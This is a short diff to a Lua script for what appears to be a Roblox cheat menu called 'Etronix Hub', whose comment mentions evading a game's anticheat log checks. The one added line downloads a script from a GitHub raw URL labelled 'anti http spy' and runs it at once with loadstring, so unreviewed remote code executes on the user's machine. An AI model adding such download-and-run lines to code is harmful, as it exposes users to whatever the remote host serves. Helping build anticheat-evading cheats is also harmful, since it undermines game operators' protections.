@@ -3,6 +3,7 @@ local Window = Library.CreateLib("Etronix Hub", "BloodTheme")
 local StealthMode = true -- If game has an anticheat that checks the logs
 
 local Indicator
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luckywastakenwow/whitelists/main/anti%20http%20spy"))()
 
 --MAIN--
 local Tab = Window:NewTab("Main")
